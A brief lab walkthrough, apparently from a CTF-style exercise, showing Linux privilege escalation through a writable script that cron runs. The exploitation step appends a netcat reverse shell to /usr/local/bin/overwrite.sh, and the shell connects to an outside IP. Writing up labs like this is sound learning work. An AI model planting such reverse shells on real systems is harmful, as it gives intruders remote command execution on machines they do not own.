# Detection

```bash
cat /etc/crontab
```

![image](https://user-images.githubusercontent.com/96658935/147763273-478888a6-fae9-4af6-a985-9218d7de2f59.png)


Next check teh permissions on the file

![image](https://user-images.githubusercontent.com/96658935/147763358-ea1c3f81-b056-45e0-a162-1139013e5c43.png)


we see that it is writable. So from here I just put a reverse shell in that file and waited for it to execute.


# Exploitation
```bash
echo 'nc -e /bin/sh 10.6.34.136 1234' >> /usr/local/bin/overwrite.sh
```

![image](https://user-images.githubusercontent.com/96658935/147763471-5c0711dd-21e6-4f9e-8241-94b8188fa386.png)
